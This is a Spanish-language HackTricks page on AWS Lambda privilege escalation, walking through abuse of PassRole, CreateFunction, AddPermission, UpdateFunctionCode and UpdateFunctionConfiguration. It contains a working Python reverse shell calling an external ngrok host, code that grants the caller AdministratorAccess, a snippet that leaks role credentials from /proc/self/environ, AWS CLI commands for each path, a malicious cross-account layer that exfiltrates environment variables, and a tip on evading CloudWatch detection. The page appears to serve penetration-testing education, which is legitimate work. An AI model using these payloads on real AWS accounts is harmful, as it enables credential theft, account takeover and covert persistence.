# AWS - Escalada de privilegios en Lambda

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## lambda

Más información sobre lambda en:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Los usuarios con los permisos **`iam:PassRole`, `lambda:CreateFunction` y `lambda:InvokeFunction`** pueden escalar sus privilegios.\
Pueden **crear una nueva función Lambda y asignarle un rol IAM existente**, otorgando a la función los permisos asociados con ese rol. Luego, el usuario puede **escribir y cargar código en esta función Lambda (con un rev shell, por ejemplo)**.\
Una vez configurada la función, el usuario puede **disparar su ejecución** y las acciones previstas invocando la función Lambda a través de la API de AWS. Este enfoque permite al usuario realizar tareas de forma indirecta a través de la función Lambda, operando con el nivel de acceso otorgado al rol IAM asociado a ella.\\

Un atacante podría abusar de esto para obtener una **shell inversa y robar el token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
También podrías **abusar de los permisos del rol lambda** desde la propia función lambda.\
Si el rol lambda tuviera suficientes permisos, podrías usarlo para otorgarte derechos de administrador:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
También es posible filtrar las credenciales del rol de la lambda sin necesidad de una conexión externa. Esto sería útil para **Lambdas aisladas de la red** utilizadas en tareas internas. Si hay grupos de seguridad desconocidos filtrando tus shells inversos, este fragmento de código te permitirá filtrar directamente las credenciales como salida de la lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Impacto Potencial:** Escalada de privilegios directos al rol de servicio lambda arbitrario especificado.

{% hint style="danger" %}
Ten en cuenta que aunque pueda parecer interesante **`lambda:InvokeAsync`**, por sí solo no permite ejecutar **`aws lambda invoke-async`**, también necesitas `lambda:InvokeFunction`.
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Al igual que en el escenario anterior, puedes **concederte a ti mismo el permiso `lambda:InvokeFunction`** si tienes el permiso **`lambda:AddPermission`**.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Impacto Potencial:** Escalada de privilegios directa al rol de servicio lambda arbitrario especificado.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Los usuarios con permisos de **`iam:PassRole`, `lambda:CreateFunction` y `lambda:CreateEventSourceMapping`** (y potencialmente `dynamodb:PutItem` y `dynamodb:CreateTable`) pueden **escalar privilegios** indirectamente incluso sin `lambda:InvokeFunction`.\
Pueden crear una **función Lambda con código malicioso y asignarle un rol IAM existente**.

En lugar de invocar directamente la Lambda, el usuario configura o utiliza una tabla DynamoDB existente, vinculándola a la Lambda a través de un mapeo de origen de eventos. Esta configuración asegura que la función Lambda se **active automáticamente al ingresar un nuevo elemento** en la tabla, ya sea por la acción del usuario u otro proceso, lo que indirectamente invoca la función Lambda y ejecuta el código con los permisos del rol IAM pasado.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Si DynamoDB ya está activo en el entorno de AWS, el usuario solo **necesita establecer el mapeo de la fuente de eventos** para la función Lambda. Sin embargo, si DynamoDB no está en uso, el usuario debe **crear una nueva tabla** con el streaming habilitado:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Ahora es posible **conectar la función Lambda a la tabla DynamoDB** mediante **la creación de un mapeo de origen de eventos**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Con la función Lambda vinculada al flujo de DynamoDB, el atacante puede **activar indirectamente la Lambda al activar el flujo de DynamoDB**. Esto se puede lograr **insertando un elemento** en la tabla de DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Impacto Potencial:** Escalada de privilegios directos al rol de servicio lambda especificado.

### `lambda:AddPermission`

Un atacante con este permiso puede **otorgarse a sí mismo (o a otros) cualquier permiso** (esto genera políticas basadas en recursos para otorgar acceso al recurso):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Impacto Potencial:** Escalada de privilegios directa al rol de servicio lambda utilizado al otorgar permiso para modificar el código y ejecutarlo.

### `lambda:AddLayerVersionPermission`

Un atacante con este permiso puede **otorgarse a sí mismo (o a otros) el permiso `lambda:GetLayerVersion`**. Podría acceder a la capa y buscar vulnerabilidades o información sensible.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Impacto potencial:** Posible acceso a información sensible.

### `lambda:UpdateFunctionCode`

Los usuarios que poseen el permiso **`lambda:UpdateFunctionCode`** tienen el potencial de **modificar el código de una función Lambda existente que está vinculada a un rol de IAM.**\
El atacante puede **modificar el código de la lambda para extraer las credenciales de IAM**.

Aunque el atacante podría no tener la capacidad directa de invocar la función, si la función Lambda ya existe y está operativa, es probable que se active a través de flujos de trabajo o eventos existentes, facilitando indirectamente la ejecución del código modificado.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Impacto Potencial:** Escalada de privilegios directa al rol de servicio lambda utilizado.

### `lambda:UpdateFunctionConfiguration`

#### Introducción

[**Capas de Lambda**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) permiten incluir **código** en tu función lambda pero **almacenándolo por separado**, de modo que el código de la función puede mantenerse pequeño y **varias funciones pueden compartir código**.

Dentro de lambda, puedes verificar las rutas desde donde se carga el código de Python con una función como la siguiente:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Estos son los lugares:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Por ejemplo, la biblioteca boto3 se carga desde `/var/runtime/boto3` (4ta posición).

#### Explotación

**Adjuntar una capa a una función** solo requiere el permiso `lambda:UpdateFunctionConfiguration` y **las capas se pueden compartir entre cuentas**. También necesitaríamos saber **qué bibliotecas están utilizando**, para poder anularlas correctamente, pero en este ejemplo, simplemente **asumiremos que la función atacada está importando boto3**.

Solo por precaución, vamos a usar Pip para instalar la misma versión de la biblioteca boto3 desde el tiempo de ejecución de Lambda que estamos apuntando (Python 3.7), solo para asegurarnos de que no haya nada diferente que pueda causar problemas en la función objetivo. Esa versión de tiempo de ejecución actualmente utiliza la versión 1.9.42 de boto3.

Con el siguiente código, instalaremos la versión 1.9.42 de boto3 y sus dependencias en una carpeta local "lambda\_layer":
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
A continuación, abriremos `/lambda_layer/boto3/__init__.py` y agregaremos el código malicioso. La carga útil que agregaremos se ve así:

![](<../../../.gitbook/assets/image (26).png>)

`requests` se importa desde `botocore`. La función exfiltrará variables de entorno, y el try-except y el tiempo de espera de 0.1 están ahí para asegurar que este código no rompa nada.

{% hint style="info" %}
**Nota importante:** Ya no debes usar `from botocore.vendored import requests` en pruebas de penetración reales, porque se imprimirá una "DeprecationWarning" en los registros de CloudWatch de esa función, lo que probablemente te hará ser descubierto por un defensor.
{% endhint %}

Ahora, empaqueta ese código en un **archivo ZIP** y **súbelo** a una **nueva capa Lambda en la cuenta del ATACANTE**. Primero deberás crear una carpeta “python” y colocar tus bibliotecas allí para que una vez que lo subamos a Lambda, el código se encuentre en “/opt/python/boto3”. Además, asegúrate de que la capa sea compatible con Python 3.7 y que la **capa esté en la misma región que nuestra función objetivo**. Una vez hecho esto, usaremos `lambda:AddLayerVersionPermission` para **hacer que la capa sea accesible públicamente** para que nuestra cuenta objetivo pueda usarla. Utiliza tus credenciales personales de AWS para esta llamada a la API.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Ahora, con las **credenciales comprometidas** que tenemos, ejecutaremos el siguiente comando en nuestra función Lambda objetivo "s3-getter", el cual **adjuntará nuestra capa Lambda de cuenta cruzada**.
```bash
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
El siguiente paso sería **invocar la función** nosotros mismos si podemos o esperar a que **sea invocada** de forma normal, que es el método más seguro.

Una **forma más sigilosa de explotar esta vulnerabilidad** se puede encontrar en:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Impacto potencial:** Escalada directa de privilegios al rol de servicio lambda utilizado.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Tal vez con esos permisos puedas crear una función y ejecutarla llamando a la URL... pero no pude encontrar una forma de probarlo, ¡así que avísame si lo haces!

### Lambda MitM

Algunas lambdas van a estar **recibiendo información sensible de los usuarios en parámetros.** Si obtienes RCE en una de ellas, puedes extraer la información que otros usuarios le están enviando, revísalo en:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Referencias

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
